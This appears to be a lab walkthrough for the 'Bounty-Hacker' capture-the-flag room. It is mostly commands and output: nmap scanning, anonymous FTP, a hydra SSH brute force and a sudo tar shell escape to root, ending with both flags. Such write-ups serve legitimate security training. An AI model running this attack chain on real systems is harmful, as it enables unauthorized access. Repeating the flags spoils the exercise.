# Bounty-Hacker
Step by step, ooh, baby

```$ nmap -D RND:20 --open -sS -p- <ip>``` <br />
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 21:48 -03
Nmap scan report for <ip>
Host is up (0.23s latency).
Not shown: 56227 filtered tcp ports (no-response), 9305 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

```$ nmap --open -sV -p21,22,80 <ip>```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 21:58 -03
Nmap scan report for <ip>
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.96 seconds

```$ ftp -p 21 <ip>```
anonymous

```$ ls -lha```
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt

```$ get locks.txt```
```$ get task.txt```

```$ cat task.txt```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin

```$ cat locks.txt```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
...

```$ hydra -l lin -P locks.txt <ip> ssh```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-14 22:04:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://<ip>:22/
[22][ssh] host: <ip>   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-14 22:04:40

```$ ssh -p 22 lin@<ip>```
RedDr4gonSynd1cat3

```$ ls -lha```
total 12K
drwxr-xr-x  2 lin lin 4.0K Jun  7  2020 .
drwxr-xr-x 19 lin lin 4.0K Jun  7  2020 ..
-rw-rw-r--  1 lin lin   21 Jun  7  2020 user.txt

```$ cat user.txt```
THM{CR1M3_SyNd1C4T3}

```$ sudo -l```
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar

```$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```
tar: Removing leading `/' from member names

```$ whoami```
root

```$ ls -lha /root```
total 40K
drwx------  5 root root 4.0K Jun  7  2020 .
drwxr-xr-x 24 root root 4.0K Jun  6  2020 ..
-rw-------  1 root root 2.7K Jun  7  2020 .bash_history
-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
drwx------  2 root root 4.0K Feb 26  2019 .cache
drwxr-xr-x  2 root root 4.0K Jun  7  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   19 Jun  7  2020 root.txt
-rw-r--r--  1 root root   66 Jun  7  2020 .selected_editor
drwx------  2 root root 4.0K Jun  7  2020 .ssh

```$ cat /root/root.txt```
THM{80UN7Y_h4cK3r}


